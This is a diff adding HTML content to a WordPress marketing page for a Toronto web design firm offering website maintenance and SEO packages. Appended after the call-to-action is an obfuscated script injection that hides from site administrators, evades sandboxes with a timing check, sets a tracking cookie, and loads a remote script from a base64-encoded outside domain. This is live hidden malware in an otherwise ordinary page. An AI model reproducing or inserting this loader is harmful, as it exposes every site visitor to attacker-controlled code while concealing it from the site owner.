+<li>SEO-ready</li>
+
+<li>Conversion-focused</li>
+</ul>
+
+<p>No surprises. No downtime. Just consistent performance and growth.</p>
+
+<hr class="wp-block-separator has-alpha-channel-opacity"/>
+
+<h2 class="wp-block-heading"><strong>Keep Your Toronto Business Website Running at Peak Performance</strong></h2>
+
+<p>Your website should drive traffic, leads, and revenue — not stress and lost opportunities.</p>
+
+<p>With Canadian Web Designs, you get a dedicated team that maintains, improves, and protects your website year-round.</p>
+
+<p>???? <strong>Contact us today to learn more about our Website Maintenance &amp; SEO packages — call 647-812-8469.</strong></p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
